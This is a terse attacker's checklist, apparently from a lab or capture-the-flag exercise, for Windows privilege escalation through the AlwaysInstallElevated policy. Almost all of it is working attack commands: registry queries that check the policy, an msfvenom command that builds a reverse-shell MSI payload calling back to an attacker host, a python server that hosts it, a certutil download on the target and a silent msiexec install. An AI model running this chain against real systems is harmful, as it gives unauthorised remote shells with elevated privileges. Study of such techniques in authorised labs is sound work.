(checklist)

- port scan
- version scan
- service scan

COMMANDS:
REG QUERY HKCU\Software\Policies\Microsoft\Windows\Installer
REG QUERY HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.121.131 lport=4443 -f msi -o aie_payload.msi

sudo python3 -m http.server 80 (urlcache is using port 80)

Let the target download the payload:
 - certutil -urlcache -f http://192.168.121.131/aie_payload.msi aie_payload.msi

Run the command below to execute the msi file:
 - msiexec  /quiet /qn  /i aie_payload.msi

go back to listening terminal